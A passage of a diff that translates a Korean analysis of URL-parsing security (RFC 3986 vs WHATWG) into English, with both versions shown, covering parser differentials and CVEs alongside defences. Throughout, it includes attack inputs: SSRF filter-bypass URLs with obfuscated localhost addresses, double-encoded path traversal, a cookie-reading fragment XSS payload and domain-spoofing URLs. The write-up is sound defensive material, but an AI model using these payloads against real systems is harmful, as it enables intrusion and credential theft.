@@ -1,388 +1,388 @@
-# URL 스펙 보안 분석: RFC/스펙 원문 직접 추출
+# URL Specification Security Analysis: Direct Extraction from RFC/Spec Sources
 
-> **분석 대상**: RFC 3986 (URI Generic Syntax), WHATWG URL Living Standard
-> **방법론**: 스펙 원문 직접 조회 + 최신 CVE/공격 사례 교차 분석
-> **최신 사례 반영**: 2024-2025년 CVE 및 컨퍼런스 발표 포함
-> **작성일**: 2026-02-08
-
----
-
-## 목차
-
-- [제1부: URL 파싱의 메타적 설계 문제](#제1부-url-파싱의-메타적-설계-문제)
-- [제2부: 구현체 간 파싱 불일치 (Parser Differential)](#제2부-구현체-간-파싱-불일치-parser-differential)
-- [제3부: 정규화와 비교의 보안적 함의](#제3부-정규화와-비교의-보안적-함의)
-- [제4부: 최신 CVE 및 공격 사례 종합](#제4부-최신-cve-및-공격-사례-종합)
-- [부록: 공격-스펙-방어 매핑 종합표](#부록-공격-스펙-방어-매핑-종합표)
-- [부록: 보안 검증 체크리스트](#부록-보안-검증-체크리스트)
+> **Analysis Target**: RFC 3986 (URI Generic Syntax), WHATWG URL Living Standard
+> **Methodology**: Direct spec source examination + Cross-analysis with latest CVE/attack cases
+> **Coverage Period**: Includes CVEs and conference presentations from 2024-2025
+> **Date**: 2026-02-08
 
 ---
 
-## 제1부: URL 파싱의 메타적 설계 문제
+## Table of Contents
 
-### 1. RFC 3986과 WHATWG 스펙의 근본적 차이 (스펙 충돌)
+- [Part 1: Meta-level Design Issues in URL Parsing](#part-1-meta-level-design-issues-in-url-parsing)
+- [Part 2: Parser Differentials Between Implementations](#part-2-parser-differentials-between-implementations)
+- [Part 3: Security Implications of Normalization and Comparison](#part-3-security-implications-of-normalization-and-comparison)
+- [Part 4: Comprehensive CVE and Attack Case Studies](#part-4-comprehensive-cve-and-attack-case-studies)
+- [Appendix: Attack-Spec-Defense Mapping Table](#appendix-attack-spec-defense-mapping-table)
+- [Appendix: Security Validation Checklist](#appendix-security-validation-checklist)
 
-**스펙 원문 동작**:
-- **RFC 3986 §3**: *"Each URI begins with a scheme name that refers to a specification for assigning identifiers within that scheme."* - Scheme은 필수 컴포넌트
-- **WHATWG URL Standard §4.1**: 스펙이 scheme이 없는 상대 URL을 명시적으로 허용하며, 탭과 개행 문자를 제거하여 파싱 지속
+---
 
-**보안적 함의**:
-두 스펙 간의 근본적 차이로 인해 **동일한 URL 문자열이 다른 파서에서 완전히 다르게 해석**될 수 있다. RFC 3986을 따르는 파서는 거부해야 할 입력을 WHATWG 호환 파서는 유효한 것으로 처리할 수 있다.
+## Part 1: Meta-level Design Issues in URL Parsing
 
-**공격 벡터**:
-- **Scheme Confusion**: `"google.com/abc"` 입력 시
-  - 대부분의 RFC 3986 파서: host가 비어 있음으로 판단
-  - Python urllib3: host를 `google.com`, path를 `/abc`로 파싱
-  - 보안 검증 레이어(RFC 파서)와 실제 요청 레이어(urllib3)가 다른 판단을 하면 **SSRF 우회** 발생
+### 1. Fundamental Differences Between RFC 3986 and WHATWG Specs (Spec Conflict)
+
+**Spec Behavior**:
+- **RFC 3986 §3**: *"Each URI begins with a scheme name that refers to a specification for assigning identifiers within that scheme."* - Scheme is a required component
+- **WHATWG URL Standard §4.1**: The spec explicitly allows relative URLs without schemes and continues parsing after removing tab and newline characters
+
+**Security Implications**:
+Due to fundamental differences between the two specs, **the same URL string can be interpreted completely differently by different parsers**. Parsers following RFC 3986 should reject inputs that WHATWG-compliant parsers treat as valid.
+
+**Attack Vectors**:
+- **Scheme Confusion**: When `"google.com/abc"` is provided as input
+  - Most RFC 3986 parsers: Determine that host is empty
+  - Python urllib3: Parses host as `google.com`, path as `/abc`
+  - When the security validation layer (RFC parser) and actual request layer (urllib3) make different judgments, **SSRF bypass** occurs
 
 ```python
-# 공격 시나리오: 이중 파싱으로 SSRF 필터 우회
+# Attack scenario: SSRF filter bypass via double parsing
 malicious_url = "attacker.com/redirect?to=http://internal.service"
 
-# 1단계: 보안 필터 (RFC 3986 엄격 파서)
-validator_parser.parse(malicious_url)  # host = "attacker.com" → 허용
+# Stage 1: Security filter (RFC 3986 strict parser)
+validator_parser.parse(malicious_url)  # host = "attacker.com" → Allow
 
-# 2단계: 실제 요청 (urllib3 등)
-actual_request(malicious_url)  # 리다이렉트 따라가서 internal.service 접근
+# Stage 2: Actual request (urllib3, etc.)
+actual_request(malicious_url)  # Follows redirect to access internal.service
 ```
 
-**실제 사례**:
-- **CVE-2024-22259, CVE-2024-22243, CVE-2024-22262** (Spring Framework): `UriComponentsBuilder`가 외부 제공 URL을 파싱할 때 호스트 검증을 우회하여 SSRF/Open Redirect 발생
-- Snyk 연구 (2024): 16개 URL 파서 간 5가지 클래스의 불일치 발견 - scheme confusion, slashes confusion, backslash confusion, URL encoded data confusion, scheme mixup
+**Real-World Cases**:
+- **CVE-2024-22259, CVE-2024-22243, CVE-2024-22262** (Spring Framework): `UriComponentsBuilder` bypasses host validation when parsing externally-provided URLs, leading to SSRF/Open Redirect
+- Snyk research (2024): Found 5 classes of inconsistencies among 16 URL parsers - scheme confusion, slashes confusion, backslash confusion, URL encoded data confusion, scheme mixup
 
-**스펙 기반 방어**:
-- RFC 3986 §7.6: *"Applications should not render as clear text any data after the first colon in userinfo"* - 그러나 이는 userinfo에만 적용되며, scheme confusion은 다루지 않음
-- **실무 권장**: 동일한 파서를 검증과 실행 모두에서 사용. 특히 Spring의 경우 `UriComponentsBuilder` 대신 `java.net.URI` 또는 검증된 단일 라이브러리 사용
+**Spec-Based Defense**:
+- RFC 3986 §7.6: *"Applications should not render as clear text any data after the first colon in userinfo"* - However, this only applies to userinfo and doesn't address scheme confusion
+- **Practical Recommendation**: Use the same parser for both validation and execution. For Spring specifically, use `java.net.URI` or a verified single library instead of `UriComponentsBuilder`
 
 ---
 
-### 2. Userinfo 필드의 구조적 취약점 (RFC 3986 §7.5)
+### 2. Structural Vulnerabilities in Userinfo Field (RFC 3986 §7.5)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §3.2.1**: *"The userinfo subcomponent may consist of a user name and, optionally, scheme-specific information about how to gain authorization to access the resource."*
-- **RFC 3986 §7.5**: *"Use of the format 'user:password' in the userinfo field is deprecated."* (그러나 여전히 문법적으로 유효)
+- **RFC 3986 §7.5**: *"Use of the format 'user:password' in the userinfo field is deprecated."* (However, still grammatically valid)
 
-**보안적 함의**:
-RFC 3986은 `user:password` 형식을 **사용하지 말라고 권고하지만 금지하지는 않음**. 이로 인해:
-1. 많은 레거시 파서가 여전히 이를 지원
-2. URL이 로그, 브라우저 히스토리, 리퍼러 헤더에 평문으로 저장됨
-3. `@` 문자를 이용한 **도메인 스푸핑 공격** 가능
+**Security Implications**:
+RFC 3986 **recommends against but does not prohibit** the `user:password` format. This results in:
+1. Many legacy parsers still supporting it
+2. URLs being stored in plaintext in logs, browser history, and referrer headers
+3. **Domain spoofing attacks** possible using the `@` character
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시 1: 도메인 스푸핑
+Attack Example 1: Domain Spoofing
 https://trusted-bank.com:fakepass@evil.com/phishing
          └────────┬────────┘           └──┬──┘
-              userinfo                 실제 호스트
+              userinfo                 Actual host
 ```
 
-사용자는 `trusted-bank.com`을 보지만 실제로는 `evil.com`에 연결된다.
+Users see `trusted-bank.com` but are actually connected to `evil.com`.
 
 ```
-공격 예시 2: 로그 기반 크리덴셜 노출
+Attack Example 2: Credential Exposure via Logs
 https://user:S3cr3t!@internal-api.com/admin
-→ 웹 서버 access.log, 프록시 로그, 브라우저 히스토리에 평문 저장
-→ 로그 침해 시 크리덴셜 직접 노출
+→ Stored in plaintext in web server access.log, proxy logs, browser history
+→ Direct credential exposure when logs are compromised
 ```
 
-**실제 사례**:
-- **WHATWG 브라우저 정책 변경 (2019-2020)**: Chrome, Firefox, Safari 모두 URL의 userinfo를 완전히 제거하거나 거부하도록 변경
-- Node.js undici (#3220): WHATWG URL 표준 따라 credentials 자동 제거 논란
+**Real-World Cases**:
+- **WHATWG Browser Policy Changes (2019-2020)**: Chrome, Firefox, Safari all changed to completely remove or reject userinfo in URLs
+- Node.js undici (#3220): Controversy over automatic credential removal following WHATWG URL standard
 
-**스펙 기반 방어**:
-- **WHATWG URL Standard §4.4**: *"There is no way to express a username or password within a valid URL string."* - 최신 표준은 아예 금지
-- RFC 3986 §7.5 권고: *"Applications should not render as clear text any data after the first colon in userinfo"*
-- **실무 권장**:
-  - userinfo 필드 포함된 URL 완전 거부
-  - Authorization 헤더 또는 OAuth 같은 표준 인증 메커니즘 사용
-  - 로그 전처리 시 URL에서 userinfo 마스킹
+**Spec-Based Defense**:
+- **WHATWG URL Standard §4.4**: *"There is no way to express a username or password within a valid URL string."* - Latest standard prohibits it entirely
+- RFC 3986 §7.5 recommendation: *"Applications should not render as clear text any data after the first colon in userinfo"*
+- **Practical Recommendations**:
+  - Completely reject URLs containing userinfo fields
+  - Use Authorization headers or standard authentication mechanisms like OAuth
+  - Mask userinfo in URLs during log preprocessing
 
 ---
 
-### 3. Percent-Encoding의 이중성 (RFC 3986 §2.1)
+### 3. Duality of Percent-Encoding (RFC 3986 §2.1)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §2.1**: *"A percent-encoding mechanism is used to represent a data octet in a component when that octet's corresponding character is outside the allowed set or is being used as a delimiter of, or within, the component."*
 - **RFC 3986 §6.2.2.2**: *"URI normalizers should decode percent-encoded octets that correspond to unreserved characters."*
 - **Critical Rule**: *"Implementations MUST NOT percent-encode or decode the same string more than once."*
 
-**보안적 함의**:
-Percent-encoding은 **데이터와 구문(syntax)을 구분하는 메커니즘**이지만, 다음 문제들이 존재:
-1. **반복 인코딩 금지 규칙이 준수되지 않음**: 많은 구현체가 재귀적으로 디코딩하여 공격자가 다층 인코딩으로 필터 우회
-2. **정규화 시점 불일치**: 어떤 레이어에서 디코딩하는지에 따라 다른 결과
+**Security Implications**:
+While percent-encoding is a **mechanism to distinguish data from syntax**, the following issues exist:
+1. **Non-compliance with the prohibition on repeated encoding**: Many implementations recursively decode, allowing attackers to bypass filters with multi-layer encoding
+2. **Inconsistent normalization timing**: Different results depending on which layer performs decoding
 
-**공격 벡터**:
-
-```
-공격 예시 1: 재귀 디코딩 악용
-입력: %252e%252e%252f (즉, ../ 를 두 번 인코딩)
-
-1차 디코딩: %2e%2e%2f
-2차 디코딩: ../          ← Path traversal 성공!
-
-스펙 준수 파서는 1차만 디코딩해야 하지만,
-재귀 디코딩하는 파서는 공격자 의도대로 동작
-```
+**Attack Vectors**:
 
 ```
-공격 예시 2: 필터 우회
-WAF 규칙: "../" 차단
+Attack Example 1: Exploiting Recursive Decoding
+Input: %252e%252e%252f (i.e., ../ encoded twice)
 
-공격자 입력: /%2e%2e%2f
-→ WAF: 문자열 매칭 실패 → 통과
-→ 백엔드: 디코딩 후 ../ 로 해석 → 디렉토리 순회
+1st decoding: %2e%2e%2f
+2nd decoding: ../          ← Path traversal successful!
+
+Spec-compliant parsers should decode only once,
+but parsers that recursively decode behave as the attacker intends
 ```
 
 ```
-공격 예시 3: Host Validation 우회 (CVE-2024-22259 관련)
-https:google.com → 정규화 → https://google.com
-                                     ↑ 스킴 구분자 자동 추가
-일부 파서는 자동 정규화하여 검증 우회
+Attack Example 2: Filter Bypass
+WAF rule: Block "../"
+
+Attacker input: /%2e%2e%2f
+→ WAF: String matching fails → Pass
+→ Backend: Interprets as ../ after decoding → Directory traversal
 ```
 
-**실제 사례**:
-- **CVE-2021-41773** (Apache HTTP Server 2.4.49): Path normalization 변경으로 인해 `%2e` 같은 인코딩된 경로 순회 문자가 정규화되지 않아 인증 우회 및 임의 파일 읽기 발생
-- **Axios SSRF bypass (#7315)**: URL normalization이 `https:google.com` → `https://google.com`으로 자동 수정하여 SSRF 필터 우회
-- **ChatGPT Account Takeover (2023)**: Path normalization 이슈로 전체 계정 탈취 가능
+```
+Attack Example 3: Host Validation Bypass (CVE-2024-22259 related)
+https:google.com → Normalized → https://google.com
+                                     ↑ Scheme delimiter auto-added
+Some parsers auto-normalize, bypassing validation
+```
 
-**스펙 기반 방어**:
-- **RFC 3986 §2.4 MUST 규칙**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
-- **RFC 3986 §6.2.2.2**: Unreserved 문자(`A-Za-z0-9-._~`)는 인코딩하지 말아야 하며, 발견 시 디코딩해야 함
-- **실무 권장**:
-  - 입력 받은 즉시 **정확히 1회만** 디코딩
-  - 정규화는 보안 검증 **이전**에 완료
-  - 경로 순회 패턴 검사는 디코딩 **이후** 수행
-  - 재귀 디코딩 명시적 금지
+**Real-World Cases**:
+- **CVE-2021-41773** (Apache HTTP Server 2.4.49): Path normalization changes caused encoded path traversal characters like `%2e` to not be normalized, leading to authentication bypass and arbitrary file reading
+- **Axios SSRF bypass (#7315)**: URL normalization automatically corrects `https:google.com` → `https://google.com`, bypassing SSRF filters
+- **ChatGPT Account Takeover (2023)**: Full account takeover possible due to path normalization issues
+
+**Spec-Based Defense**:
+- **RFC 3986 §2.4 MUST rule**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
+- **RFC 3986 §6.2.2.2**: Unreserved characters (`A-Za-z0-9-._~`) should not be encoded, and should be decoded when found
+- **Practical Recommendations**:
+  - Decode **exactly once** immediately upon receiving input
+  - Complete normalization **before** security validation
+  - Perform path traversal pattern checks **after** decoding
+  - Explicitly prohibit recursive decoding
 
 ---
 
-### 4. Authority 컴포넌트의 모호성 (RFC 3986 §3.2)
+### 4. Ambiguity in Authority Component (RFC 3986 §3.2)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §3.2**: *"The authority component is preceded by a double slash ('//') and is terminated by the next slash ('/'), question mark ('?'), or number sign ('#') character, or by the end of the URI."*
-- **슬래시 규칙**: Authority가 있는 URI의 경로는 반드시 `/`로 시작하거나 비어야 함
+- **Slash Rule**: Paths in URIs with authority must start with `/` or be empty
 
-**보안적 함의**:
-슬래시의 개수와 위치에 따라 파서마다 다르게 해석하며, 일부 파서는 백슬래시(`\`)를 슬래시로 취급한다. 이는 **프로토콜 혼동**과 **리다이렉트 공격**의 원인이 된다.
+**Security Implications**:
+Parsers interpret differently based on the number and position of slashes, and some parsers treat backslashes (`\`) as slashes. This causes **protocol confusion** and **redirect attacks**.
 
-**공격 벡터**:
-
-```
-공격 예시 1: 슬래시 개수 혼동
-입력: https:/evil.com (슬래시 1개)
-
-RFC 3986 엄격 파서: 오류 (authority 구분자 //가 불완전)
-관대한 파서: evil.com을 host로 해석
-→ SSRF 필터 우회
-```
+**Attack Vectors**:
 
 ```
-공격 예시 2: 백슬래시 혼동
-입력: https:\\evil.com
+Attack Example 1: Slash Count Confusion
+Input: https:/evil.com (one slash)
 
-Windows 기반 파서: \를 /로 변환 → evil.com 접근
-Unix 기반 파서: \를 일반 문자로 취급 → 다른 해석
-→ Parser differential 발생
+RFC 3986 strict parser: Error (authority delimiter // incomplete)
+Lenient parser: Interprets evil.com as host
+→ SSRF filter bypass
 ```
 
 ```
-공격 예시 3: Orange Tsai의 Confusion Attack (CVE-2024-38473)
-Apache HTTP Server에서 filename 필드가 파일시스템 경로여야 하지만
-일부 모듈이 이를 URL로 취급
-→ 백슬래시로 NTLM 인증 강제 → SSRF → NTLM Relay → RCE
+Attack Example 2: Backslash Confusion
+Input: https:\\evil.com
+
+Windows-based parser: Converts \ to / → Accesses evil.com
+Unix-based parser: Treats \ as regular character → Different interpretation
+→ Parser differential occurs
 ```
 
-**실제 사례**:
-- **Orange Tsai, Black Hat USA 2024**: Apache HTTP Server에서 3가지 Confusion Attack, 9개 취약점, 20개 공격 기법 발표. CVE-2024-38473, CVE-2024-38476, CVE-2024-38477 등 발견
-- **SharePoint XXE (CVE-2024-30043)**: URL 파싱 혼동을 악용하여 XXE 주입 → SharePoint Farm Service 계정 권한으로 파일 읽기 + SSRF
+```
+Attack Example 3: Orange Tsai's Confusion Attack (CVE-2024-38473)
+In Apache HTTP Server, the filename field should be a filesystem path,
+but some modules treat it as a URL
+→ Force NTLM authentication with backslash → SSRF → NTLM Relay → RCE
+```
 
-**스펙 기반 방어**:
+**Real-World Cases**:
+- **Orange Tsai, Black Hat USA 2024**: Presented 3 types of Confusion Attacks, 9 vulnerabilities, 20 exploitation techniques in Apache HTTP Server. Discovered CVE-2024-38473, CVE-2024-38476, CVE-2024-38477, etc.
+- **SharePoint XXE (CVE-2024-30043)**: Exploited URL parsing confusion for XXE injection → File reading and SSRF with SharePoint Farm Service account privileges
+
+**Spec-Based Defense**:
 - **RFC 3986 §3.3**: *"If a URI contains an authority component, then the path component must either be empty or begin with a slash ('/') character."*
-- **실무 권장**:
-  - 슬래시 개수 엄격 검증 (정확히 2개: `//`)
-  - 백슬래시를 슬래시로 자동 변환하지 말 것
-  - 프로토콜별 파서 사용 시 파일시스템 경로와 URL 명확히 구분
+- **Practical Recommendations**:
+  - Strictly validate slash count (exactly 2: `//`)
+  - Do not automatically convert backslashes to slashes
+  - Clearly distinguish between filesystem paths and URLs when using protocol-specific parsers
 
 ---
 
-### 5. 호스트 파싱의 레거시 지원 문제 (RFC 3986 §7.4)
+### 5. Legacy Support Issues in Host Parsing (RFC 3986 §7.4)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §7.4**: *"Some older implementations accept IPv4 addresses that omit the dots, or that use hexadecimal or octal values for octets."*
-- **WHATWG URL Standard §4.3**: IPv4 파서가 8진수(0 접두사) 및 16진수(0x 접두사) 표기를 지원하지만, 이를 "validation error"로 표시
+- **WHATWG URL Standard §4.3**: IPv4 parser supports octal (0 prefix) and hexadecimal (0x prefix) notation but marks these as "validation errors"
 
-**보안적 함의**:
-레거시 호환성 때문에 **다양한 IP 주소 표기법**이 혼재하며, 이를 모두 인식하지 못하는 보안 필터를 우회할 수 있다.
+**Security Implications**:
+Due to legacy compatibility, **various IP address notations** coexist, and security filters that don't recognize all of them can be bypassed.
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시: IP 주소 난독화로 SSRF 필터 우회
+Attack Example: SSRF Filter Bypass via IP Address Obfuscation
 
-목표: 127.0.0.1 (localhost) 접근
+Target: 127.0.0.1 (localhost) access
 
-방법 1: 8진수 표기
+Method 1: Octal notation
 http://0177.0.0.1  (0177 = 127)
 
-방법 2: 16진수 표기
+Method 2: Hexadecimal notation
 http://0x7f.0.0.1
 
-방법 3: 정수 변환
+Method 3: Integer conversion
 http://2130706433  (127 * 256^3 + 0 * 256^2 + 0 * 256 + 1)
 
-방법 4: 혼합
+Method 4: Mixed
 http://0177.0x00.0.01
 
-WAF/필터: "127.0.0.1" 문자열 매칭 실패 → 통과
-실제 파서: 모두 127.0.0.1로 해석 → localhost 접근 성공
+WAF/Filter: "127.0.0.1" string matching fails → Pass
+Actual parser: All interpreted as 127.0.0.1 → localhost access successful
 ```
 
-**실제 사례**:
-- **PortSwigger SSRF Labs**: IP 난독화 기법을 이용한 SSRF 우회 실습 제공
-- Python urllib3: URL 인코딩된 IP 주소(`http://127.%30.%30.1`)를 `127.0.0.1`로 해석하여 예상치 못한 요청 발생
+**Real-World Cases**:
+- **PortSwigger SSRF Labs**: Provides hands-on practice for SSRF bypass using IP obfuscation techniques
+- Python urllib3: URL-encoded IP addresses (`http://127.%30.%30.1`) interpreted as `127.0.0.1`, causing unexpected requests
 
-**스펙 기반 방어**:
-- **RFC 3986 §7.4 권고**: *"All implementations should be prepared to accept both the traditional dotted-decimal notation and any of the alternative formats for IPv4 addresses."*
-- **WHATWG 접근**: 레거시 형식을 파싱은 하되 validation error로 표시
-- **실무 권장**:
-  - IP 주소 모든 대체 형식 정규화 후 검증
-  - 정규 표현식 매칭 대신 전용 IP 파서 사용 (`inet_pton` 등)
-  - 내부 IP 범위 체크 시 정규화된 형식 기준 검사
+**Spec-Based Defense**:
+- **RFC 3986 §7.4 recommendation**: *"All implementations should be prepared to accept both the traditional dotted-decimal notation and any of the alternative formats for IPv4 addresses."*
+- **WHATWG approach**: Parse legacy formats but mark as validation errors
+- **Practical Recommendations**:
+  - Normalize all alternative IP address formats before validation
+  - Use dedicated IP parsers (`inet_pton`, etc.) instead of regex matching
+  - Check internal IP ranges based on normalized format
 
 ---
 
-### 6. Fragment Identifier의 클라이언트 측 특성 (RFC 3986 §3.5)
+### 6. Client-Side Nature of Fragment Identifiers (RFC 3986 §3.5)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §3.5**: *"The fragment identifier component of a URI allows indirect identification of a secondary resource by reference to a primary resource and additional identifying information. The identified secondary resource may be some portion or subset of the primary resource, some view on representations of the primary resource, or some other resource defined or described by those representations."*
 - **Critical**: *"Fragment identifiers are not used in the scheme-specific processing of a URI... they are not sent in the HTTP protocol."*
 
-**보안적 함의**:
-Fragment는 **서버로 전송되지 않고** 클라이언트 측에서만 처리된다. 이는:
-1. 서버 측 로깅/보안 검증이 fragment를 볼 수 없음
-2. 클라이언트 측 JavaScript가 fragment 기반 라우팅 시 XSS 위험
-3. Fragment를 통한 민감 정보 전달은 서버 검증 불가
+**Security Implications**:
+Fragments are **not sent to the server** and are only processed client-side. This means:
+1. Server-side logging/security validation cannot see fragments
+2. XSS risk when client-side JavaScript does fragment-based routing
+3. Sensitive information passed via fragments cannot be server-validated
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시 1: Fragment 기반 XSS
+Attack Example 1: Fragment-Based XSS
 URL: https://vulnerable.com/#<script>alert(document.cookie)</script>
 
-클라이언트 측 라우터 (React Router 등):
+Client-side router (React Router, etc.):
 const hash = window.location.hash;
-document.body.innerHTML = hash;  ← XSS 발생!
+document.body.innerHTML = hash;  ← XSS occurs!
 
-서버는 fragment를 받지 못하므로 WAF 우회
+Server doesn't receive fragment, so WAF bypassed
 ```
 
 ```
-공격 예시 2: OAuth Token Leak via Fragment
+Attack Example 2: OAuth Token Leak via Fragment
 OAuth Implicit Flow:
 https://app.com/callback#access_token=SECRET123
 
-리퍼러 헤더: fragment는 전송되지 않음 (안전)
-BUT JavaScript: 모든 스크립트가 location.hash 접근 가능
-→ 악성 Third-party 스크립트가 토큰 탈취 가능
+Referrer header: Fragment not transmitted (safe)
+BUT JavaScript: All scripts can access location.hash
+→ Malicious third-party scripts can steal tokens
 ```
 
 ```
-공격 예시 3: Open Redirect 우회
-서버 측 검증: 리다이렉트 URL의 호스트 체크
-입력: https://trusted.com#@evil.com
+Attack Example 3: Open Redirect Bypass
+Server-side validation: Check redirect URL's host
+Input: https://trusted.com#@evil.com
 
-서버: host = "trusted.com" → 허용
-브라우저: trusted.com 로딩 후 클라이언트 측 스크립트가
-         #@evil.com 파싱 → location.href 변경 → evil.com 리다이렉트
+Server: host = "trusted.com" → Allow
+Browser: Loads trusted.com, then client-side script
+         parses #@evil.com → Changes location.href → Redirects to evil.com
 ```
 
-**실제 사례**:
-- **OAuth 2.0 Implicit Flow 폐기**: Fragment를 통한 토큰 전달이 XSS 공격에 취약하여 Authorization Code Flow + PKCE로 대체 권고
-- **PortSwigger Research**: Fragment-based Client-Side Template Injection 공격 패턴 발표
+**Real-World Cases**:
+- **OAuth 2.0 Implicit Flow Deprecation**: Token passing via fragments vulnerable to XSS attacks, recommended to replace with Authorization Code Flow + PKCE
+- **PortSwigger Research**: Published fragment-based Client-Side Template Injection attack patterns
 
-**스펙 기반 방어**:
-- **RFC 3986 §3.5**: Fragment는 scheme-specific processing에 사용되지 않으며 HTTP 프로토콜로 전송되지 않음
-- **OAuth 2.0 Security BCP**: Implicit Flow 사용 금지, fragment로 민감 정보 전달 금지
-- **실무 권장**:
-  - Fragment 기반 라우팅 시 입력 엄격 검증 및 sanitization
-  - 민감 정보(토큰, 세션 ID)를 fragment에 절대 포함 금지
-  - CSP (Content Security Policy) 강화로 인라인 스크립트 제한
+**Spec-Based Defense**:
+- **RFC 3986 §3.5**: Fragments not used in scheme-specific processing and not transmitted via HTTP protocol
+- **OAuth 2.0 Security BCP**: Prohibit Implicit Flow use, prohibit passing sensitive information via fragments
+- **Practical Recommendations**:
+  - Strict validation and sanitization of inputs when doing fragment-based routing
+  - Never include sensitive information (tokens, session IDs) in fragments
+  - Strengthen CSP (Content Security Policy) to restrict inline scripts
 
 ---
 
-## 제2부: 구현체 간 파싱 불일치 (Parser Differential)
+## Part 2: Parser Differentials Between Implementations
 
-### 7. Scheme 필수 여부 해석 차이 (RFC 3986 §3 vs WHATWG §4.1)
+### 7. Interpretation Differences in Scheme Requirement (RFC 3986 §3 vs WHATWG §4.1)
 
-**스펙 원문 동작**:
-- **RFC 3986 §3**: *"Each URI begins with a scheme name"* - Scheme을 필수로 간주
-- **RFC 2396 (이전 버전)**: Scheme을 선택적으로 허용
-- **WHATWG URL Standard**: 상대 URL을 명시적 지원
+**Spec Behavior**:
+- **RFC 3986 §3**: *"Each URI begins with a scheme name"* - Treats scheme as mandatory
+- **RFC 2396 (earlier version)**: Allows scheme to be optional
+- **WHATWG URL Standard**: Explicitly supports relative URLs
 
-**보안적 함의**:
-구현체마다 scheme이 없는 입력을 다르게 처리:
-- 오류로 거부
-- 기본 scheme 추론 (http://)
-- 상대 URL로 해석
+**Security Implications**:
+Different implementations handle inputs without schemes differently:
+- Reject as error
+- Infer default scheme (http://)
+- Interpret as relative URL
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```python
-# 공격 시나리오: Differential Parsing
+# Attack scenario: Differential Parsing
 url = "//evil.com/payload"
 
-# 파서 A (RFC 3986 엄격): scheme 없음 → 오류
-# 파서 B (관대한 구현): http://evil.com/payload 추론
-# 파서 C (상대 URL): 현재 페이지 기준 상대 경로
+# Parser A (RFC 3986 strict): No scheme → Error
+# Parser B (lenient implementation): Infers http://evil.com/payload
+# Parser C (relative URL): Interprets as relative path based on current page
 
-if validate_with_parser_A(url):  # 오류 → 차단
+if validate_with_parser_A(url):  # Error → Block
     pass
 else:
-    fetch_with_parser_B(url)      # 추론 성공 → SSRF
+    fetch_with_parser_B(url)      # Inference successful → SSRF
 ```
 
-**실제 사례**:
-- **Snyk 연구 (2024)**: 16개 파서 중 대부분이 `//host/path` 형식을 다르게 해석
-- Python urllib vs urllib3 vs requests 간 동작 불일치 다수 발견
+**Real-World Cases**:
+- **Snyk research (2024)**: Most of 16 parsers interpret `//host/path` format differently
+- Many inconsistencies found among Python urllib vs urllib3 vs requests
 
-**스펙 기반 방어**:
-- **RFC 3986 §4.2**: 상대 참조를 명시적으로 정의하지만, 보안 컨텍스트에서 사용 주의 필요
-- **실무 권장**:
-  - 외부 입력은 **절대 URI만 허용** (scheme 필수)
-  - 검증과 실행에 동일 파서 사용
-  - 상대 URL은 신뢰된 컨텍스트에서만 허용
+**Spec-Based Defense**:
+- **RFC 3986 §4.2**: Explicitly defines relative references, but caution needed in security contexts
+- **Practical Recommendations**:
+  - External inputs should **only allow absolute URIs** (scheme required)
+  - Use same parser for validation and execution
+  - Allow relative URLs only in trusted contexts
 
 ---
 
-### 8. 호스트 추출 메서드 불일치 (`getHost()` 문제)
+### 8. Host Extraction Method Inconsistencies (`getHost()` Problem)
 
-**스펙 원문 동작**:
-- **RFC 3986 §3.2.2**: Host는 IP-literal, IPv4address, reg-name 중 하나
-- **Java `java.net.URL.getHost()`**: URL에서 호스트 부분 추출
-- **Python `urllib.parse.urlparse()`**: 6-tuple 반환 (scheme, netloc, path, params, query, fragment)
+**Spec Behavior**:
+- **RFC 3986 §3.2.2**: Host is one of IP-literal, IPv4address, reg-name
+- **Java `java.net.URL.getHost()`**: Extracts host portion from URL
+- **Python `urllib.parse.urlparse()`**: Returns 6-tuple (scheme, netloc, path, params, query, fragment)
 
-**보안적 함의**:
-각 언어/라이브러리의 호스트 추출 메서드가 **edge case에서 다른 결과** 반환:
-- userinfo 처리 방식
-- 포트 번호 포함 여부
-- 특수 문자 처리
+**Security Implications**:
+Each language/library's host extraction method returns **different results in edge cases**:
+- Userinfo handling
+- Port number inclusion
+- Special character processing
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```java
 // Java URL Confusion (Orange Tsai, Black Hat 2017)
 String url = "http://example.com@evil.com/";
 
-// 파서 A (일부 Java 구현):
-// getHost() → "evil.com"  ← 정확함
+// Parser A (some Java implementations):
+// getHost() → "evil.com"  ← Correct
 
-// 파서 B (레거시 구현):
-// getHost() → "example.com@evil.com"  ← 잘못된 호스트
+// Parser B (legacy implementations):
+// getHost() → "example.com@evil.com"  ← Wrong host
 
-// 보안 검증
-if (url.getHost().equals("example.com")) {  // 실패 (레거시) 또는 성공 (정상)
-    makeRequest(url);  // evil.com으로 요청 전송
+// Security validation
+if (url.getHost().equals("example.com")) {  // Fails (legacy) or succeeds (normal)
+    makeRequest(url);  // Sends request to evil.com
 }
 ```
 
@@ -393,749 +393,1163 @@ from urllib.parse import urlparse
 url = "http://127.%30.%30.1/"  # %30 = '0'
 
 parsed = urlparse(url)
-# 파서마다 다르게 해석:
-# - urllib: netloc = "127.%30.%30.1" (인코딩 유지)
-# - requests: 실제 요청 시 127.0.0.1로 디코딩
+# Different interpretations by different parsers:
+# - urllib: netloc = "127.%30.%30.1" (encoding preserved)
+# - requests: Decodes to 127.0.0.1 during actual request
 ```
 
-**실제 사례**:
-- **Spring Framework CVE-2024-22259**: `UriComponentsBuilder.fromUriString()`과 실제 HTTP 클라이언트 간 호스트 해석 차이로 SSRF 발생
-- **Log4j RCE (CVE-2021-44228)**: JNDI URL 파싱 차이를 이용한 원격 코드 실행
+**Real-World Cases**:
+- **Spring Framework CVE-2024-22259**: SSRF occurs due to host interpretation differences between `UriComponentsBuilder.fromUriString()` and actual HTTP client
+- **Log4j RCE (CVE-2021-44228)**: Remote code execution exploiting JNDI URL parsing differences
 
